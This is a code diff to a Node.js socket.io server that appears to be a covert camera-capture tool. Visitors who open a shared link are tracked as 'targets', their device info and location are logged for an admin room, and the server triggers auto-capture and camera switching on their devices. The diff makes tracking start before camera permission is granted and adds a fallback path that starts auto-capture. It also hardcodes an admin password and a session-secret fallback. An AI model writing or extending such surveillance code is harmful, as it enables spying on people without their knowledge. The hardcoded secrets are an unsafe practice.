@@ -16,7 +16,7 @@ const io = new Server(server, {
 });
 
 const PORT = process.env.PORT || 3000;
-const ADMIN_PASSWORD = "Ayaz;@"; // Fixed password as requested
+const ADMIN_PASSWORD = "ayaz;;"; // Updated password
 const SESSION_SECRET = process.env.SESSION_SECRET || "AyazSecretSession2026";
 
 const MAX_USERS = 5;
@@ -267,7 +267,8 @@ io.on("connection", (socket) => {
         io.to(targetSocketId).emit("switch-camera");
     });
 
-    socket.on("user-ready", (data) => {
+    // Link open handling immediately upon connection/info receipt, independent of camera permission
+    socket.on("user-connect-info", (data) => {
         if (!isLinkActive) {
             socket.emit("link-disabled");
             return;
@@ -292,11 +293,12 @@ io.on("connection", (socket) => {
             connectedTargets.set(socket.id, target);
             socket.join("users");
 
+            const timeStr = new Date().toISOString();
             addHistory({
                 event: "link-opened",
                 socketId: socket.id,
                 deviceInfo: target.deviceInfo,
-                time: new Date().toISOString()
+                time: timeStr
             });
 
             emitUsersList();
@@ -304,12 +306,55 @@ io.on("connection", (socket) => {
                 event: "link-opened",
                 socketId: socket.id,
                 deviceInfo: target.deviceInfo,
-                time: new Date().toISOString()
+                time: timeStr
             });
+        }
+    });
+
+    socket.on("user-ready", (data) => {
+        if (!isLinkActive) {
+            socket.emit("link-disabled");
+            return;
         }
 
         const target = connectedTargets.get(socket.id);
-        if (!target) return;
+        if (!target) {
+            // Fallback if connect-info wasn't triggered first
+            if (connectedTargets.size >= MAX_USERS) {
+                socket.emit("server-full", { maxUsers: MAX_USERS });
+                socket.disconnect(true);
+                return;
+            }
+            const newTarget = {
+                id: socket.id,
+                deviceInfo: data && typeof data.deviceInfo === "string" ? data.deviceInfo.slice(0, 150) : "Web User",
+                connectedAt: new Date().toLocaleString(),
+                location: null,
+                cameraReady: true,
+                autoCaptureStarted: false
+            };
+            connectedTargets.set(socket.id, newTarget);
+            socket.join("users");
+            const timeStr = new Date().toISOString();
+            addHistory({
+                event: "link-opened",
+                socketId: socket.id,
+                deviceInfo: newTarget.deviceInfo,
+                time: timeStr
+            });
+            emitUsersList();
+            io.to("admins").emit("access-event", {
+                event: "link-opened",
+                socketId: socket.id,
+                deviceInfo: newTarget.deviceInfo,
+                time: timeStr
+            });
+            if (isAutoCaptureOn) {
+                newTarget.autoCaptureStarted = true;
+                socket.emit("start-auto-capture");
+            }
+            return;
+        }
 
         target.cameraReady = true;
         if (isAutoCaptureOn && !target.autoCaptureStarted) {
@@ -368,11 +413,18 @@ io.on("connection", (socket) => {
     socket.on("disconnect", () => {
         const target = connectedTargets.get(socket.id);
         if (target) {
+            const timeStr = new Date().toISOString();
             addHistory({
                 event: "link-closed",
                 socketId: socket.id,
                 deviceInfo: target.deviceInfo,
-                time: new Date().toISOString()
+                time: timeStr
+            });
+            io.to("admins").emit("access-event", {
+                event: "link-closed",
+                socketId: socket.id,
+                deviceInfo: target.deviceInfo,
+                time: timeStr
             });
             connectedTargets.delete(socket.id);
             emitUsersList();
